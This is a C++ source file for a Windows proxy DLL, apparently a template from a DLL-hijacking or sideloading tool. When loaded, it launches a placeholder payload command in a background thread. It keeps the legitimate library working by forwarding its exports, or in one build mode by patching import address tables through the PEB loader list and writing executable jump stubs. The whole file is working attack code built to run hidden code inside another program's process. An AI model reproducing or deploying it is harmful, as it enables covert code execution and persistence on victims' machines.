#include <Windows.h>
#include <winternl.h>
#include <map>
#include <string>
#include <algorithm>

#ifdef _REBUILD
BOOL RebuildExportTable(PBYTE ourBase, PBYTE targetBase);
#endif

#ifdef _FORWARD

#pragma comment(linker,"/export:Static=Functions.Static")
#pragma comment(linker,"/export:Dynamic=Functions.Dynamic")

#else

extern "C" __declspec(dllexport) BOOL Static()
{
	return FALSE;
};

extern "C" __declspec(dllexport) BOOL Dynamic()
{
	return FALSE;
};
#endif

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason != DLL_PROCESS_ATTACH)
		return TRUE;

	DisableThreadLibraryCalls(hinstDLL);

#ifndef _REBUILD
	static LONG launched = 0;
	if (InterlockedCompareExchange(&launched, 1, 0) == 0) {
		CreateThread(nullptr, 0, [](LPVOID) -> DWORD {
			wchar_t imagePath[MAX_PATH] = { 0 };
			if (!GetModuleFileNameW(nullptr, imagePath, ARRAYSIZE(imagePath)))
				return 0;

			std::wstring processName = imagePath;
			const size_t lastSlash = processName.find_last_of(L"\\/");
			if (lastSlash != std::wstring::npos) {
				processName = processName.substr(lastSlash + 1);
			}

			std::transform(processName.begin(), processName.end(), processName.begin(), towlower);
__PROCESS_GUARD__
			STARTUPINFOW si = { 0 };
			PROCESS_INFORMATION pi = { 0 };
			si.cb = sizeof(si);

			wchar_t commandLine[] = L"__PAYLOAD_COMMAND__";
			if (CreateProcessW(nullptr, commandLine, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
				CloseHandle(pi.hThread);
				CloseHandle(pi.hProcess);
			}

			return 0;
		}, nullptr, 0, nullptr);
	}
#endif

#ifdef _REBUILD
	HMODULE real_dll = LoadLibrary(L"Functions.dll");
	RebuildExportTable((PBYTE)hinstDLL, (PBYTE)real_dll);
#endif

	return (TRUE);
}


#ifdef _REBUILD

PBYTE AllocateUsableMemory(PBYTE baseAddress, DWORD size, DWORD protection = PAGE_READWRITE) {

#ifdef _WIN64
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);
	PIMAGE_OPTIONAL_HEADER optionalHeader = &ntHeaders->OptionalHeader;

	baseAddress = baseAddress + optionalHeader->SizeOfImage;

	for (PBYTE offset = baseAddress; offset < baseAddress + MAXDWORD; offset += 1024 * 8) {
		PBYTE usuable = (PBYTE)VirtualAlloc(
			offset,
			size,
			MEM_RESERVE | MEM_COMMIT,
			protection);

		if (usuable) {
			ZeroMemory(usuable, size);
			return usuable;
		}
	}
#else
	PBYTE usuable = (PBYTE)VirtualAlloc(
		NULL,
		size,
		MEM_RESERVE | MEM_COMMIT,
		protection);

	if (usuable) {
		ZeroMemory(usuable, size);
		return usuable;
	}
#endif
	return 0;
}

typedef struct _UNICODE_STR
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

BOOL RebuildExportTable(PBYTE ourBase, PBYTE targetBase)
{
#ifdef _WIN64
	BYTE jmpPrefix[] = { 0x48, 0xb8 };
	BYTE jmpRax[] = { 0xff, 0xe0 };
#else
	BYTE jmpPrefix[] = { 0x68 };
	BYTE jmpRax[] = { 0xc3 };
#endif

	std::map<std::string, PBYTE> exports;

	auto targetHeaders = (PIMAGE_NT_HEADERS)(targetBase + PIMAGE_DOS_HEADER(targetBase)->e_lfanew);
	auto exportDataDir = &targetHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (exportDataDir->Size == 0)
		return FALSE;

	auto targetExportDirectory = PIMAGE_EXPORT_DIRECTORY(targetBase + exportDataDir->VirtualAddress);

	auto nameOffsetList = PDWORD(targetBase + targetExportDirectory->AddressOfNames);
	auto addressList = PDWORD(targetBase + targetExportDirectory->AddressOfFunctions);
	auto ordinalList = PWORD(targetBase + targetExportDirectory->AddressOfNameOrdinals);

	auto ourHeaders = (PIMAGE_NT_HEADERS)(ourBase + PIMAGE_DOS_HEADER(ourBase)->e_lfanew);
	auto ourExportDataDir = &ourHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (ourExportDataDir->Size == 0)
		return FALSE;

	auto ourExportDirectory = PIMAGE_EXPORT_DIRECTORY(ourBase + ourExportDataDir->VirtualAddress);

	for (DWORD i = 0; i < targetExportDirectory->NumberOfNames; i++) {
		std::string functionName = LPSTR(targetBase + nameOffsetList[i]);
		if (functionName.empty()) continue;
		PBYTE code = PBYTE(targetBase + addressList[ordinalList[i]]);
		exports.insert(std::pair<std::string, PBYTE>(functionName, code));
	}

#if defined(_WIN64)
	auto peb = PPEB(__readgsqword(0x60));
#else
	auto peb = PPEB(__readfsdword(0x30));
#endif

	auto ldr = peb->Ldr;
	auto lpHead = &ldr->InMemoryOrderModuleList, lpCurrent = lpHead;

	while ((lpCurrent = lpCurrent->Flink) != lpHead)
	{
		PLDR_DATA_TABLE_ENTRY dataTable = CONTAINING_RECORD(lpCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		auto base = PBYTE(dataTable->DllBase);
		auto ntHeaders = PIMAGE_NT_HEADERS(PBYTE(dataTable->DllBase) + PIMAGE_DOS_HEADER(dataTable->DllBase)->e_lfanew);
		auto iatDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT];
		auto importDirectory = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

		if (iatDirectory->Size == 0 || importDirectory->Size == 0)
			continue;

		auto importList = PIMAGE_IMPORT_DESCRIPTOR(base + importDirectory->VirtualAddress);
		auto iatList = PIMAGE_THUNK_DATA(base + iatDirectory->VirtualAddress);

		DWORD oldProtect = 0;
		if (!VirtualProtect(
			iatList,
			iatDirectory->Size,
			PAGE_READWRITE,
			&oldProtect)) {
			return FALSE;
		}

		CHAR ourPath[MAX_PATH];
		LPSTR ourName = ourPath;
		GetModuleFileNameA((HMODULE)ourBase, ourPath, MAX_PATH);

		for (DWORD i = 0; ourPath[i] != NULL; i++) {
			if (ourPath[i] == '\\' || ourPath[i] == '/')
				ourName = &ourPath[i + 1];
		}

		for (; importList->OriginalFirstThunk != 0; importList++)
		{
			auto moduleName = LPSTR(base + importList->Name);
			if (_stricmp(ourName, moduleName) != 0)
				continue;

			auto thunkData = PIMAGE_THUNK_DATA(base + importList->FirstThunk);
			auto originalThunkData = PIMAGE_THUNK_DATA(base + importList->OriginalFirstThunk);

			for (; originalThunkData->u1.AddressOfData != 0; originalThunkData++, thunkData++) {
				if (originalThunkData->u1.AddressOfData & IMAGE_ORDINAL_FLAG) {
					OutputDebugString(L"[!!] Ordinal import\n");
					continue;
				}

				PIMAGE_IMPORT_BY_NAME importByName = PIMAGE_IMPORT_BY_NAME(base + originalThunkData->u1.AddressOfData);
				std::map<std::string, PBYTE>::const_iterator pos = exports.find(std::string(importByName->Name));
				if (pos == exports.end())
					continue;

				OutputDebugString(L"[++] Patching IAT for: ");
				OutputDebugStringA(importByName->Name);

				thunkData->u1.AddressOfData = ULONGLONG(pos->second);
			}

			break;
		}

		if (!VirtualProtect(
			iatList,
			iatDirectory->Size,
			oldProtect,
			&oldProtect)) {
			return FALSE;
		}
	}

	auto ourNameOffsetList = PDWORD(ourBase + ourExportDirectory->AddressOfNames);
	auto ourAddressList = PDWORD(ourBase + ourExportDirectory->AddressOfFunctions);
	auto ourOrdinalList = PWORD(ourBase + ourExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < ourExportDirectory->NumberOfNames; i++) {
		std::string functionName = LPSTR(ourBase + ourNameOffsetList[i]);
		if (functionName.empty()) continue;
		std::map<std::string, PBYTE>::const_iterator pos = exports.find(functionName);
		if (pos == exports.end())
			continue;

		PBYTE functionStub = AllocateUsableMemory(ourBase, sizeof(jmpPrefix) + sizeof(PVOID) + sizeof(jmpRax), PAGE_EXECUTE_READWRITE);
		if (!functionStub)
			return FALSE;

		PBYTE current = functionStub;
		memcpy(current, jmpPrefix, sizeof(jmpPrefix));
		current += sizeof(jmpPrefix);
		*((PVOID*)current) = pos->second;
		current += sizeof(PVOID);
		memcpy(current, jmpRax, sizeof(jmpRax));

		ourAddressList[ourOrdinalList[i]] = DWORD(functionStub - ourBase);
	}

	return TRUE;
}
#endif
